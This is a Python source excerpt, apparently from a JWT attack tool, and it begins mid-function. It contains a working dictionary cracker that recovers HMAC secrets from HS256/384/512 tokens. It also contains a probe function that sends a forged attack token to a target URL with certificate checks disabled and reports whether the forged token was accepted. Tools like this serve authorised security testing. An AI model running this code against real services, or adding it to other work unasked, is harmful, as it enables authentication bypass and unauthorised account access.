    if not parsed.get("valid_jwt"):
        return {"success": False, "error": "Invalid JWT format."}

    alg = (parsed.get("algorithm") or "").upper()
    if not alg.startswith("HS"):
        return {
            "success": False,
            "error": f"Algorithm '{alg}' is asymmetric or not HMAC (crackable only with HS256, HS384, HS512)."
        }

    h_b64 = parsed["header_b64"]
    p_b64 = parsed["payload_b64"]
    target_sig = parsed["sig_b64"]
    signing_input = f"{h_b64}.{p_b64}".encode("utf-8")

    hash_func = hashlib.sha256
    if alg == "HS384":
        hash_func = hashlib.sha384
    elif alg == "HS512":
        hash_func = hashlib.sha512

    wordlist = list(COMMON_JWT_SECRETS)
    if custom_wordlist and isinstance(custom_wordlist, list):
        wordlist = custom_wordlist + wordlist

    start_time = time.time()
    for candidate in wordlist:
        candidate_bytes = candidate.encode("utf-8")
        calc_sig = b64url_encode(hmac.new(candidate_bytes, signing_input, hash_func).digest())
        if hmac.compare_digest(calc_sig, target_sig):
            elapsed = time.time() - start_time
            return {
                "success": True,
                "cracked": True,
                "secret": candidate,
                "algorithm": alg,
                "elapsed_seconds": round(elapsed, 4),
                "tested_count": wordlist.index(candidate) + 1
            }

    elapsed = time.time() - start_time
    return {
        "success": True,
        "cracked": False,
        "message": f"Secret not found in {len(wordlist)} dictionary candidates.",
        "algorithm": alg,
        "elapsed_seconds": round(elapsed, 4),
        "tested_count": len(wordlist)
    }


def probe_jwt_attack(
    url: str,
    method: str,
    attack_token: str,
    headers: Optional[Dict[str, str]] = None,
    body: Optional[str] = None,
    timeout: int = 20,
    expected_success_string: Optional[str] = None,
    expected_failure_string: Optional[str] = None
) -> Dict[str, Any]:
    """
    Send an HTTP request with the attack token substituted into the Authorization header.
    Optionally evaluates success and failure strings to eliminate false positives.
    """
    req_headers = dict(headers or {})
    auth_key = next((k for k in req_headers if k.lower() == "authorization"), "Authorization")
    req_headers[auth_key] = f"Bearer {attack_token}"

    clean_method = (method or "GET").upper()
    start_time = time.time()

    try:
        resp = requests.request(
            method=clean_method,
            url=url,
            headers=req_headers,
            data=body.encode("utf-8") if (body and clean_method in ("POST", "PUT", "PATCH")) else None,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        elapsed = round(time.time() - start_time, 3)
        resp_text = resp.text[:4000] if resp.text else ""

        success_matched = None
        if expected_success_string and expected_success_string.strip():
            success_matched = expected_success_string.strip().lower() in resp_text.lower()

        failure_matched = None
        if expected_failure_string and expected_failure_string.strip():
            failure_matched = expected_failure_string.strip().lower() in resp_text.lower()

        return {
            "success": True,
            "status_code": resp.status_code,
            "reason": resp.reason,
            "elapsed_seconds": elapsed,
            "content_length": len(resp.content),
            "response_snippet": resp_text,
            "headers": dict(resp.headers),
            "is_timeout": False,
            "success_string_matched": success_matched,
            "failure_string_matched": failure_matched
        }
    except requests.exceptions.Timeout as e:
        elapsed = round(time.time() - start_time, 3)
        return {
            "success": False,
            "error": f"Request timed out after {elapsed}s (timeout limit was {timeout}s)",
            "elapsed_seconds": elapsed,
            "status_code": 0,
            "reason": "Timed Out",
            "is_timeout": True,
            "success_string_matched": None,
            "failure_string_matched": None
        }
    except Exception as e:
        elapsed = round(time.time() - start_time, 3)
        return {
            "success": False,
            "error": str(e),
            "elapsed_seconds": elapsed,
            "status_code": 0,
            "reason": "Connection Error",
            "is_timeout": False,
            "success_string_matched": None,
            "failure_string_matched": None
        }

